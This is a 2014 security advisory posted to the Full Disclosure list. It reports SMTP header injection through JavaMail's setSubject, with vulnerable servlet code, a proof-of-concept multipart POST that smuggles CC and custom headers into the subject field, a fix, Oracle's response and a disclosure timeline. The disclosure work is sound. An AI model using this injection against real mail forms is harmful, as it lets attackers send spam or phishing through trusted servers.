@@ -1,0 +1,306 @@
+
+Date: Mon, 19 May 2014 15:30:51 +0200
+From: "Alexandre Herzog" <alexandre.herzog@...c.ch>
+To: <fulldisclosure@...lists.org>, <bugtraq@...urityfocus.com>
+Subject: [FD] JavaMail SMTP Header Injection via method setSubject
+	[CSNC-2014-001]
+
+#############################################################
+#
+# COMPASS SECURITY ADVISORY
+# http://www.csnc.ch/en/downloads/advisories.html
+#
+#############################################################
+#
+# Product:	JavaMail
+# Vendor:	Oracle
+# CSNC ID:	CSNC-2014-001 
+# CVD ID:	<none>
+# Subject:	SMTP Header Injection via method setSubject
+# Risk:		Medium
+# Effect:	Remotely exploitable
+# Author:	Alexandre Herzog <alexandre.herzog@...c.ch>
+# Date:		19.05.2014
+#
+#############################################################
+
+Introduction:
+-------------
+The JavaMail API provides a platform-independent and 
+protocol-independent framework to build mail and messaging applications. 
+The JavaMail API is available as an optional package for use with the 
+Java SE platform and is also included in the Java EE platform.[1] 
+
+JavaMail does not check if the email subject contains a Carriage Return 
+(CR) or a Line Feed (LF) character on POST multipart requests. This 
+issue allows the injection of arbitrary SMTP headers in the generated
+email. This flaw can be used for sending SPAM or other social 
+engineering attacks (e.g. abusing a trusted server to send HTML emails
+with malicious content). 
+
+
+Affected:
+---------
+The following versions of JavaMail were tested and found vulnerable:
+- 1.4.5 (included in the .war file used as demo from [2])
+- 1.5.1 (latest version downloaded on 31.12.2013 from [3])
+
+ 
+Technical Description
+---------------------
+The tests were performed using the .war file downloaded from [2]. That 
+code features an example on how to send a file per email using JSP and
+a servlet. The relevant parts of this example are:
+	[...]
+	/**
+	 * A utility class for sending e-mail message with attachment.
+	 * @author www.codejava.net
+	 *
+	 */
+	public class EmailUtility {
+		 
+		/**
+		 * Sends an e-mail message from a SMTP host with a list of attached files.
+		 *
+		 */
+		public static void sendEmailWithAttachment(String host, String port,
+				final String userName, final String password, String toAddress,
+				String subject, String message, List<File> attachedFiles)
+						throws AddressException, MessagingException {
+			// sets SMTP server properties
+			Properties properties = new Properties();
+			properties.put("mail.smtp.host", host);
+			properties.put("mail.smtp.port", port);
+			properties.put("mail.smtp.auth", "true");
+			properties.put("mail.smtp.starttls.enable", "true");
+			properties.put("mail.user", userName);
+			properties.put("mail.password", password);
+	 
+			// creates a new session with an authenticator
+			Authenticator auth = new Authenticator() {
+				public PasswordAuthentication getPasswordAuthentication() {
+					return new PasswordAuthentication(userName, password);
+				}
+			};
+			Session session = Session.getInstance(properties, auth);
+	 
+			// creates a new e-mail message
+			Message msg = new MimeMessage(session);
+	 
+			msg.setFrom(new InternetAddress(userName));
+			InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
+			msg.setRecipients(Message.RecipientType.TO, toAddresses);
+==>			msg.setSubject(subject);
+			msg.setSentDate(new Date());
+	[...]
+	
+	[...]
+	/**
+	 * A servlet that takes message details from user and send it as a new e-mail
+	 * through an SMTP server. The e-mail message may contain attachments which
+	 * are the files uploaded from client.
+	 *
+	 * @author www.codejava.net
+	 *
+	 */
+	@WebServlet("/SendMailAttachServlet")
+	
+	// CSNC comment - this tag enables the processing of POST multipart requests
+	@MultipartConfig(fileSizeThreshold = 1024 * 1024 * 2,   // 2MB
+					maxFileSize = 1024 * 1024 * 10,         // 10MB
+					maxRequestSize = 1024 * 1024 * 50)      // 50MB
+	public class SendMailAttachServlet extends HttpServlet {
+		private String host;
+		private String port;
+		private String user;
+		private String pass;
+	 
+		public void init() {
+			// reads SMTP server setting from web.xml file
+			ServletContext context = getServletContext();
+			host = context.getInitParameter("host");
+			port = context.getInitParameter("port");
+			user = context.getInitParameter("user");
+			pass = context.getInitParameter("pass");
+		}
+	 
+		/**
+		 * handles form submission
+		 */
+		protected void doPost(HttpServletRequest request,
+				HttpServletResponse response) throws ServletException, IOException {
+			 
+			List<File> uploadedFiles = saveUploadedFiles(request);
+			 
+			String recipient = request.getParameter("recipient");
+==>			String subject = request.getParameter("subject");
+			String content = request.getParameter("content");
+	 
+			String resultMessage = "";
+	 
+			try {
+==>				EmailUtility.sendEmailWithAttachment(host, port, user, pass,
+						recipient, subject, content, uploadedFiles);
+				 
+				resultMessage = "The e-mail was sent successfully";
+			} catch (Exception ex) {
+
+
+Below is a genuine request POST request for the example above, done
+using "Content-Type: multipart" as it involves uploading a file: 
+	POST /EmailAttachWebApp/SendMailAttachServlet HTTP/1.1
+	Host: localhost:8080
+	[...]
+	Connection: keep-alive
+	Content-Type: multipart/form-data; boundary=---------------------------205721274512326
+	Content-Length: 1785
+
+	-----------------------------205721274512326
+	Content-Disposition: form-data; name="recipient"
+
+	test@[redacted]
+	-----------------------------205721274512326
+	Content-Disposition: form-data; name="subject"
+
+	With javax.mail.1.5.1
+	-----------------------------205721274512326
+	Content-Disposition: form-data; name="content"
+
+	SMTP header injection test
+	-----------------------------205721274512326
+	Content-Disposition: form-data; name="file"; filename="NOTICE"
+	Content-Type: application/octet-stream
+
+	Apache Tomcat
+	Copyright 1999-2012 The Apache Software Foundation 
+	[...]
+	
+	
+"Content-Type: multipart" allows us to submit a string containing a CR 
+or LF without having to use HEX characters %0A and %0D nor \n and \r. In 
+the JavaMail case, we abuse this feature to inject additional SMTP 
+headers through the Subject parameter in the request: 
+	POST /EmailAttachWebApp/SendMailAttachServlet HTTP/1.1
+	Host: localhost:8080
+	[...]
+	Connection: keep-alive
+	Content-Type: multipart/form-data; boundary=---------------------------205721274512326
+	Content-Length: 1839
+
+	-----------------------------205721274512326
+	Content-Disposition: form-data; name="recipient"
+
+	test@[redacted]
+	-----------------------------205721274512326
+	Content-Disposition: form-data; name="subject"
+
+	With javax.mail.1.5.1
+==>	CC: injected.header@[redacted]
+==>	X-other-header: foo bar
+	-----------------------------205721274512326
+	Content-Disposition: form-data; name="content"
+
+	SMTP header injection test
+	-----------------------------205721274512326
+	Content-Disposition: form-data; name="file"; filename="NOTICE"
+	Content-Type: application/octet-stream
+
+	Apache Tomcat
+	Copyright 1999-2012 The Apache Software Foundation
+	[...]
+	
+This email is sent successfully and is received by the recipient under 
+the following form, where the injected SMTP headers are clearly visible: 
+	[...]
+	From: [redacted]@gmail.com
+	To: test@[redacted]
+	Message-ID: <52c2e778.01030e0a.7154.fffff0c2@...google.com>
+	Subject: With javax.mail.1.5.1
+	CC: injected.header@[redacted]
+==>	X-other-header: foo bar
+	MIME-Version: 1.0
+	Content-Type: multipart/mixed; 
+		boundary="----=_Part_0_1681986934.1388504951836"
+	[...]
+
+	------=_Part_0_1681986934.1388504951836
+	Content-Type: text/html; charset=us-ascii
+	Content-Transfer-Encoding: 7bit
+
+	SMTP header injection test
+	------=_Part_0_1681986934.1388504951836
+	Content-Type: application/octet-stream; name=NOTICE
+	Content-Transfer-Encoding: 7bit
+	Content-Disposition: attachment; filename=NOTICE
+
+	Apache Tomcat
+	Copyright 1999-2012 The Apache Software Foundation
+	[...]
+
+
+The same behavior can be observed when using JavaMail 1.4.5 (bundled by 
+default in the example .war [2]) instead of the latest 1.5.1 JavaMail 
+version. 
+
+
+Workaround / Fix:
+-----------------
+Ensure your application strictly follows the JavaMail API and ensures 
+the subject string does not contain any line breaks (as stated in some 
+parts of the API [4]). An alternative would be to fix the setSubject 
+method of JavaMail by either disallowing the usage of CR/LF characters 
+or appending a space after each CR/LF character to be RFC compliant (see 
+2.2.3 Long Header Fields of RFC 2822 [5]). 
+
+Oracle issued the following statement regarding this matter: "The 
+assessment from our engineering team is that this is not a bug in 
+JavaMail API. The application is responsible to perform some input 
+validation. In this particular case, the application is responsible for 
+ensuring that the subject string does not contain any line breaks. The 
+code demonstrated the issue is not an Oracle sample. Therefore, we are 
+closing the issue as not-a-bug." 
+
+
+Timeline:
+---------
+2014-05-19:		Global publication of the advisory
+2014-03-19:		Advisory sent to Compass Security's customers
+2014-02-19:		Got confirmation from Oracle they agree our publication
+				schedule
+2014-02-18:		Informed Oracle that we plan to publish details of this
+				issue to our customer this week and to the general
+				public in a month
+2014-02-05:		Informed Oracle we consider publishing this information
+2014-02-04:		Response from Oracle: is not considered a bug
+2014-01-23:		Status report from Oracle mentioning the case being
+				"Under investigation / Being fixed in main codeline"
+2014-01-01:		Reception acknowledgement from Oracle
+2014-01-01:		Sending advisory and PoC to Oracle
+2014-01-01:		Isolation and reproduction of an issue discovered
+				previously by the author
+
+
+References:
+-----------
+[1] http://www.oracle.com/technetwork/java/javamail/index.html
+[2] http://www.codejava.net/java-ee/jsp/send-attachments-with-e-mail-using-jsp-servlet-and-javamail
+[3] https://java.net/projects/javamail/pages/Home
+[4] https://javamail.java.net/nonav/docs/api/javax/mail/internet/MimeMessage.html#setSubject(java.lang.String)
+[5] http://www.ietf.org/rfc/rfc2822.txt
+
+
+
+--
+Alexandre Herzog, CTO, Compass Security Schweiz AG
+Werkstrasse 20, 8645 Jona, Switzerland
+Schauplatzgasse 39, 3011 Bern, Switzerland
+http://www.csnc.ch/
+
+
+Download attachment "smime.p7s" of type "application/x-pkcs7-signature" (5234 bytes)
+
+
+_______________________________________________
+Sent through the Full Disclosure mailing list
+http://nmap.org/mailman/listinfo/fulldisclosure
+Web Archives & RSS: http://seclists.org/fulldisclosure/
